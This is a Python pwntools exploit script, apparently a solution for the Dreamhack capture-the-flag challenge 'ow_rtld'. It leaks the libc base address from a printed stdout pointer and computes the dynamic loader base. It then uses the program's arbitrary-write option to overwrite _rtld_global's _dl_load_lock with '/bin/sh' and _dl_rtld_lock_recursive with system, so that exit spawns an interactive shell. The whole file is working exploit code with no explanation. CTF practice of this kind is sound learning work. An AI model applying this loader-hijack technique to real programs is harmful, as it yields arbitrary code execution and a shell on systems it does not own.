#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./ow_rtld_patched', checksec=False)

libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

gs = """
b *main
b *main+240
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 17958)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})
    
def overwrite(addr, data):
    sl(b'1')
    sla(b'addr: ', str(addr).encode())
    sla(b'data: ', str(data).encode())
    io.recvuntil(b'> ')
io = start()
io.recvuntil(b'stdout: ')
libc.address = int(io.recvn(14), 16) - libc.sym['_IO_2_1_stdout_']
ld.address = libc.address + 0x3f1000
success(f"libc @ {hex(libc.address)}")
success(f"ld @ {hex(ld.address)}")

system = libc.sym['system']
_rtld_global = ld.sym['_rtld_global']
_dl_rtld_lock_recursive = _rtld_global + 0xf00
_dl_load_lock = _rtld_global + 0x908

info(f"_dl_load_lock @ {hex(_dl_load_lock)}")

io.recvuntil(b'> ')
binsh = unpack(b'/bin/sh\x00')
overwrite(_dl_load_lock, binsh)
overwrite(_dl_rtld_lock_recursive, system)
sl(b'2')

io.interactive()